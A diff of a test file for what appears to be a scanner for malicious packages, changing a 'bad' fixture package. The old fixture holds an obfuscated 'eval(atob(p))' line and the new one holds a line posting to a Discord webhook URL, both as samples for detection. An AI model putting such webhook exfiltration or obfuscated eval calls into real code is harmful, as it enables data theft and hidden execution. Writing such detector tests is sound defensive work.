@@ -16,7 +16,11 @@ from kitsunox.stages.static import ContentCache, analyse_batch, new_contents
 
 T0 = datetime(2026, 10, 1, tzinfo=UTC)
 BASE = {"index.js": b"module.exports = 1", "README.md": b"hi"}
-BAD = {"index.js": b"module.exports = 1", "lib/x.js": b"eval(atob(p))", "README.md": b"hi"}
+BAD = {
+    "index.js": b"module.exports = 1",
+    "lib/x.js": b"post('https://discord.com/api/webhooks/1/x')",
+    "README.md": b"hi",
+}
 CLEAN = {"index.js": b"module.exports = 2", "README.md": b"hi"}
 
 
